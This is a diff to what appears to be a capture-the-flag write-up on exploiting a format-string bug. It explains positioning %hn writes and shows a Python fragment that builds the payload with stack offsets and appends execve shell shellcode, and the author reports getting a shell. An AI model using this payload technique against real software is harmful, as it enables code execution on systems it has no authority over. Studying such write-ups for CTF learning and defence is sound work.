@@ -2154,7 +2154,7 @@ We need to build an input that looks like this
 ```xml
   <address><address+2>%<x>x%<offset>$hn%<y>x%<offset+1>$hn
 ```
-we need to split the address up and do 2 writes, with %hn . We have our offsets from earlier testing. The tricky part now was getting the x and y values which will determine what is written to those locations by %n by providing a "bytes written" value. The method on codearcana didnt work out for me on this challenge, so I basically threw in a number for y and saw what was written to address+2. I then calced the dif, and modified the value accordingly until i got what i needed! Theres probably a more "scientific" method to go about this, but I was ready to get this done ;)
+we need to split the address up and do 2 writes, with %hn . We have our offsets from earlier testing. The tricky part now was getting the x and y values which will determine what is written to those locations by %n by providing a "bytes written" value. The method on codearcana didnt work out for me on this challenge, probably because there is the "Login from 127.0.0.1:56418 as [x] with password" , so I basically threw in a number for y and saw what was written to address+2. I then calced the dif, and modified the value accordingly until i got what i needed! Theres probably a more "scientific" method to go about this, but I was ready to get this done ;)
 
 After some testing , I ended up with the following values for my system. I could then throw shellcode on the end and jump to where it sat on the stack, and was able to get a shell!
 
@@ -2181,7 +2181,7 @@ try:
     p +="x%20$hn" #offset to hit target loc on stack
     p +="%10483"  #value to write 0xffff
     p +="x%21$hn " #stack offset+1
-    p += "\x31\xc0\x50\x68\x2f\x2f\x73"
+    p += "\x31\xc0\x50\x68\x2f\x2f\x73"  #some shellcode
     p += "\x68\x68\x2f\x62\x69\x6e\x89"
     p += "\xe3\x89\xc1\x89\xc2\xb0\x0b"
     p += "\xcd\x80\x31\xc0\x40\xcd\x80"
